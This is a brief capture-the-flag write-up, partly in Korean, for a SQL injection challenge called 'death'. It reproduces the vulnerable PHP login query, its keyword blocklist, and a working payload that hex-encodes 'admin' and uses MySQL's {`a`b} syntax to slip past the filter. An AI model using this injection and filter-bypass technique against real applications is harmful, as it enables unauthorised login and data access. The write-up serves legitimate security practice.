# death

## 1. Code
```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_death where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("death");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- `prob _ . () admin`을 필터링 한다.   
- 쿼리가 실행되어, id값이 'admin'이라면 문제가 해결된다.   

## 3. Solution   

이전 문제 <a href="./../cthulhu/cthulhu.md">cthulhu</a>와 같은 문제이다.   
웹방화벽(WAF) 우회를 목적으로 ``{`a`b}``구문을 이용하였다.   

변수 | 값
---|---
pw | ``1') or {`if`id=0x61646d696e}%23``